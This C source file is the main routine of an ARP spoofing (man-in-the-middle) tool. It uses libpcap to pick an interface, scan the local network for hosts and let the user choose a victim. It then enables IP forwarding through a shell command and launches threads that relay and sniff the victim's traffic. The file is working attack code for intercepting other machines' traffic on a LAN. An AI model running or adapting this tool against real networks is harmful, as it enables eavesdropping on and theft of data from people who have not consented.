#include "mainArpSpoofing.h"
#include "common_func.h"

int main() {
	pcap_t *handle;
	pcap_if_t *alldevs, *device;
	_SPOOF arp_info, relay_info, sniff_info;
	pthread_t sniffThread, relayThread;
	struct pcap_pkthdr *header;
	struct libnet_ethernet_hdr *eth_hdr;
	struct libnet_arp_hdr *arp_hdr;

	char errbuff[PCAP_ERRBUF_SIZE] = {0,};
	char ipbuff[32] = {0,};
	char ipbuff2[32] = {0,};
	char cmdbuff[10] = {0,};
		
	const u_char *pkt_data;

	int count = 0, sel_number = 0, res = 0, exitflag = 0, target_count = 0;
	int func_flag = 0, threadErr = 0, status = 0;

	if(pcap_findalldevs(&alldevs, errbuff) > 0) {
		printf("pcap_findalldevs Error\n");
		return 1;
	}
	
	printf("-------------------------------------------------------Choose the your device-------------------------------------------------------\n");
	for(device = alldevs; device; device = device->next)
		printf("\t%d :  %s\n", ++count, (device->description)?(device->description):(device->name));
	if(count == 0) {
		printf("\nNo interfaces found! Make sure libpcap is installed.\n");
		return 1;
	}
	printf("------------------------------------------------------------------------------------------------------------------------------------\n");
	printf("Select Number (Exit - 0): ");
	if(scanf("%d", &sel_number)) {
		if(!(sel_number >= 0 && sel_number <= count)) {
			printf("\nInterface Number Out of Range.\n");
			return 1;
		} 
		if(sel_number == 0) return 0;
	}

	for(device = alldevs, count = 0; device; device = device->next) if(sel_number == ++count) break;

	if(GetMyAdapter_info(device->name, arp_info.getMyIp, arp_info.getMyMac)) {
		print_info_comm_func(NULL, NULL, NULL, START_MY);
		func_flag++;
	}
	else printf("GetMyAdapter_info() Error\n");

	if(GetGateway_info(arp_info.getRouteIp, arp_info.getRouteMac)) {
		print_info_comm_func(NULL, NULL, NULL, START_ROUTE);
		func_flag++;
	}
	else printf("GetGateway_info() Error\n");

	if(!(handle = pcap_open_live(device->name, 65536, 1, 1000, errbuff))) {
		printf("pcap_open_live Error %s : %s\n", device->name, errbuff);
		goto exit;
	}

	if(!GetIpScan_Thread(arp_info.getMyIp, arp_info.getMyMac, arp_info.getRouteIp, handle)) printf("GetIpScan_Thread() Error\n");
	else print_info_comm_func(NULL, NULL, NULL, START_IPSCAN);

	while((res = pcap_next_ex(handle, &header, &pkt_data)) >= 0) {
		if(res == 0) continue;
		if(header->len != header->caplen) {
			printf("Pcap File Error\n");
			return 1;
		}

		eth_hdr = (struct libnet_ethernet_hdr *)pkt_data;
		switch (ntohs(eth_hdr->ether_type)) {
			case ETHERTYPE_ARP : 
				if(!strcasecmp((const char *)arp_info.getMyMac, (const char *)eth_hdr->ether_dhost)) {
					arp_hdr = (struct libnet_arp_hdr *)(pkt_data + sizeof(*eth_hdr));
					if(ARPOP_REPLY == ntohs(arp_hdr->ar_op))
						if(!strncmp(inet_ntop(AF_INET, &arp_info.getMyIp, ipbuff, sizeof(ipbuff)), inet_ntop(AF_INET, &arp_hdr->ar_tpa, ipbuff2, sizeof(ipbuff2)), sizeof(ipbuff))) 
							TargetReplyScan(arp_hdr);
				}
				break;
		}
		exitflag = setPcapExitFlag();
		if(exitflag == EXIT_OK) {
			target_count = setTargetCount();
			goto out;
		}
	}
out:
	printf("-------------------------------------------------------Choose the your Target-------------------------------------------------------\n");
	while(1) {
		printf("Select Number (Exit - 0): ");
		if(scanf("%d", &sel_number)) {
			if(!(sel_number >= 0 && sel_number <= target_count)) printf("\nTarget Number Out of Range.\n");
			else if(sel_number == 0) return 0;
			else break;
		}
	}

	if(setTargetNumber(sel_number, arp_info.getTargetIp, arp_info.getTargetMac)) func_flag++;
	else printf("setTargetNumber() Error\n");

	if(func_flag == 3) {
		if(!(res = system("clear"))) {
			print_info_comm_func(device->name, arp_info.getMyIp, arp_info.getMyMac, BASIC);
			print_info_comm_func("Route", arp_info.getRouteIp, arp_info.getRouteMac, BASIC);
			print_info_comm_func("Target", arp_info.getTargetIp, arp_info.getTargetMac, BASIC);
			relay_info = arp_info;
			sniff_info = arp_info;
			if(!popen_comm_func("if [ -f \"/proc/sys/net/ipv4/ip_forward\" ]; then echo 1 > /proc/sys/net/ipv4/ip_forward; echo success; else echo failed; fi;", cmdbuff, sizeof(cmdbuff)))
			print_info_comm_func(NULL, NULL, NULL, POPEN);

			SetArpRelayPcapHandle(handle);
			if((threadErr = pthread_create(&relayThread, NULL, GetArpRelay_ThreadRun, (void *)&relay_info)) < 0) {
				printf("Relay Thread Err = %d\n", threadErr);
				return -1;
			}

			SetArpSniffPcapHandle(handle);
			if((threadErr = pthread_create(&sniffThread, NULL, TargetSniffing_ThreadRun, (void *)&sniff_info)) < 0) {
				printf("Sniffing Thread Err = %d\n", threadErr);
				return -1;
			}
			
			pthread_join(relayThread, (void **)&status);
			pthread_join(sniffThread, (void **)&status);
		}
	}
	
exit:
	pcap_freealldevs(alldevs);
	return 0;
}
